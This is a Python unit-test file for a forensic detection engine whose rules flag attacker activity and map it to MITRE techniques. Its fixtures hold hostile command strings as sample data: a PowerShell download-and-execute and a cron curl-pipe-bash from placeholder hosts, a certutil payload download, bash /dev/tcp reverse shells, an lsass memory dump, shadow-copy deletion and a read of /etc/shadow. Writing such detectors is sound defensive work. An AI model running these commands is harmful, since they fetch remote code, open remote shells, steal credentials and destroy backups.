"""Unit tests for proprietary detection rules and detection engine."""

from __future__ import annotations

import io

from waeaa_ingestor.detection.engine import DetectionEngine
from waeaa_ingestor.detection.models import Severity
from waeaa_ingestor.detection.rules import (
    CredentialDumpingRule,
    ExecutionFromTempRule,
    LinuxCronSuspiciousRule,
    LinuxReverseShellRule,
    LinuxShadowAccessRule,
    LogClearingRule,
    LOLBinsExecutionRule,
    PowerShellSuspiciousRule,
    RegistryRunPersistenceRule,
    ShadowCopyDeletionRule,
    SuspiciousServiceRule,
)
from waeaa_ingestor.parsers.base import ParsedRecord


def test_log_clearing_rule() -> None:
    rule = LogClearingRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="System.evtx",
        timestamp_utc="2026-10-22T08:00:00Z",
        action="AuditLogCleared",
        summary="Event 1102: Audit log was cleared",
        details={"event_id": 1102},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1070.001"


def test_suspicious_service_rule() -> None:
    rule = SuspiciousServiceRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="System.evtx",
        timestamp_utc="2026-10-22T08:05:00Z",
        action="ServiceInstalled",
        summary="Service Installed: BackdoorSvc",
        details={
            "event_id": 7045,
            "service_name": "BackdoorSvc",
            "image_path": r"powershell.exe -enc AAAA== C:\Temp\run.ps1",
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1543.003"


def test_powershell_suspicious_rule() -> None:
    rule = PowerShellSuspiciousRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="Microsoft-Windows-PowerShell%4Operational.evtx",
        timestamp_utc="2026-10-22T08:10:00Z",
        action="ScriptBlockExecution",
        summary="PowerShell executed script block",
        details={
            "event_id": 4104,
            "script_text": "IEX ((New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1'))",
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1059.001"


def test_shadow_copy_deletion_rule() -> None:
    rule = ShadowCopyDeletionRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="console.log",
        timestamp_utc="2026-10-22T08:15:00Z",
        action="ShellCommand",
        summary="Command executed",
        details={"command": "vssadmin.exe delete shadows /all /quiet"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1490"


def test_credential_dumping_rule() -> None:
    rule = CredentialDumpingRule()
    rec = ParsedRecord(
        artefact_type="EventLog",
        source_file="Security.evtx",
        timestamp_utc="2026-10-22T08:20:00Z",
        action="ProcessCreation",
        summary="procdump.exe executed",
        details={"command": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1003.001"


def test_lolbins_execution_rule() -> None:
    rule = LOLBinsExecutionRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="cmd_history.txt",
        timestamp_utc="2026-10-22T08:25:00Z",
        action="ShellCommand",
        summary="certutil download",
        details={
            "command": "certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\beacon.exe"
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH
    assert finding.mitre is not None
    assert finding.mitre.technique_id == "T1218"


def test_execution_from_temp_rule() -> None:
    rule = ExecutionFromTempRule()
    rec = ParsedRecord(
        artefact_type="Prefetch",
        source_file="MALWARE-ABCD.pf",
        timestamp_utc="2026-10-22T08:30:00Z",
        action="Executed",
        summary="MALWARE executed from \\AppData\\Local\\Temp\\malware.exe",
        details={"target_path": r"C:\Users\Analyst\AppData\Local\Temp\malware.exe"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.MEDIUM


def test_registry_run_persistence_rule() -> None:
    rule = RegistryRunPersistenceRule()
    rec = ParsedRecord(
        artefact_type="RegistryRunKey",
        source_file="NTUSER.DAT",
        timestamp_utc="2026-10-22T08:35:00Z",
        action="RunKeyDetected",
        summary="Run Key: Updater -> powershell.exe -w hidden C:\\Temp\\sync.ps1",
        details={
            "value_name": "Updater",
            "value_data": r"powershell.exe -w hidden C:\Temp\sync.ps1",
        },
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_linux_shadow_access_rule() -> None:
    rule = LinuxShadowAccessRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="/home/dev/.bash_history",
        timestamp_utc="2026-10-22T08:40:00Z",
        action="ShellCommand",
        summary="[dev] cat /etc/shadow",
        details={"command": "cat /etc/shadow"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_linux_reverse_shell_rule() -> None:
    rule = LinuxReverseShellRule()
    rec = ParsedRecord(
        artefact_type="ShellHistory",
        source_file="/root/.bash_history",
        timestamp_utc="2026-10-22T08:45:00Z",
        action="ShellCommand",
        summary="[root] bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        details={"command": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.CRITICAL


def test_linux_cron_suspicious_rule() -> None:
    rule = LinuxCronSuspiciousRule()
    rec = ParsedRecord(
        artefact_type="CronJob",
        source_file="/etc/crontab",
        timestamp_utc="2026-10-22T08:50:00Z",
        action="CronJob",
        summary="Cron Job [root]: curl -s http://evil.com/setup.sh | bash (* * * * *)",
        details={"command": "curl -s http://evil.com/setup.sh | bash"},
    )
    finding = rule.evaluate(rec)
    assert finding is not None
    assert finding.severity == Severity.HIGH


def test_detection_engine_analyze_and_export() -> None:
    engine = DetectionEngine()
    records = [
        ParsedRecord(
            artefact_type="EventLog",
            source_file="System.evtx",
            timestamp_utc="2026-10-22T09:00:00Z",
            action="AuditLogCleared",
            summary="Audit log was cleared",
            details={"event_id": 1102},
        ),
        ParsedRecord(
            artefact_type="ShellHistory",
            source_file="/root/.bash_history",
            timestamp_utc="2026-10-22T09:01:00Z",
            action="ShellCommand",
            summary="[root] bash -i >& /dev/tcp/10.0.0.1/9999 0>&1",
            details={"command": "bash -i >& /dev/tcp/10.0.0.1/9999 0>&1"},
        ),
    ]

    findings = engine.analyze(records)
    assert len(findings) == 2

    # Severity counts
    counts = engine.get_severity_counts(findings)
    assert counts["Critical"] == 2

    # MITRE summary
    mitre_sum = engine.get_mitre_summary(findings)
    assert "Defense Evasion" in mitre_sum
    assert "Execution" in mitre_sum

    # Export JSON
    json_buf = io.StringIO()
    engine.write_json(findings, json_buf)
    assert "T1070.001" in json_buf.getvalue()

    # Export CSV
    csv_buf = io.StringIO()
    engine.write_csv(findings, csv_buf)
    assert "T1059.004" in csv_buf.getvalue()
